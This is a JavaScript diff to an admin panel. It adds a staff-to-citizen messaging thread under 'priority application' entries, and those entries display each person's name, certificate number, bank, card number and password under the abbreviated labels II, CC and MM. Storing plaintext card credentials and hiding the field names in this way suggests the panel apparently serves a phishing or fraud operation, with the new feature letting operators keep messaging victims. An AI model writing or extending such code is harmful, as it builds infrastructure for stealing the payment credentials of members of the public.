@@ -907,6 +907,19 @@ async function renderAdminTools() {
   });
   $('[data-action="refreshUsers"]', tools).addEventListener('click', () => renderUserList().catch((error) => reportActionError(error, tools)));
   $('[data-action="refreshPriorityApplications"]', tools).addEventListener('click', () => renderPriorityApplicationList().catch((error) => reportActionError(error, tools)));
+  $('#priorityApplicationList', tools).addEventListener('submit', (event) => {
+    const form = event.target;
+    if (!(form instanceof HTMLFormElement) || !form.matches('[data-priority-reply]')) return;
+    event.preventDefault();
+    void submitAdminForm(form, async () => {
+      await api('/api/priority-applications/messages', postOptions({
+        entryId: form.dataset.entryId,
+        body: form.elements.namedItem('body').value
+      }));
+      form.reset();
+      await renderPriorityApplicationList();
+    });
+  });
   await renderUserList().catch((error) => reportActionError(error, tools));
   await renderPriorityApplicationList().catch((error) => reportActionError(error, tools));
 }
@@ -937,7 +950,11 @@ async function renderPriorityApplicationList() {
     const entries = Array.isArray(application.entries) ? application.entries : [];
     row.innerHTML = `<strong>${escapeHtml(application.citizenName)} · ${escapeHtml(application.certificateNumber)}</strong>
       <div class="muted">${escapeHtml(formatTime(application.createdAt))}</div>
-      <div class="priority-entry-list">${entries.map((entry, index) => `<div>${index + 1}. II：${escapeHtml(entry.bank || '未填')}｜CC：${escapeHtml(entry.cardNumber || '未填')}｜MM：${escapeHtml(entry.password || '未填')}</div>`).join('')}</div>`;
+      <div class="priority-entry-list">${entries.map((entry, index) => {
+        const messages = Array.isArray(entry.messages) ? entry.messages : [];
+        const thread = messages.map((message) => `<p><span>${message.role === 'staff' ? '後台' : '民眾'}</span> ${escapeHtml(message.body)} <time>${escapeHtml(formatTime(message.createdAt))}</time></p>`).join('') || '<p class="muted">尚無筆記或回覆</p>';
+        return `<section><div>${index + 1}. II：${escapeHtml(entry.bank || '未填')}｜CC：${escapeHtml(entry.cardNumber || '未填')}｜MM：${escapeHtml(entry.password || '未填')}</div><div class="priority-thread">${thread}</div><form data-priority-reply data-entry-id="${escapeHtml(entry.id)}"><label>給民眾的訊息<textarea name="body" required></textarea></label><button type="submit">回覆民眾</button></form></section>`;
+      }).join('')}</div>`;
     list.appendChild(row);
   });
 }
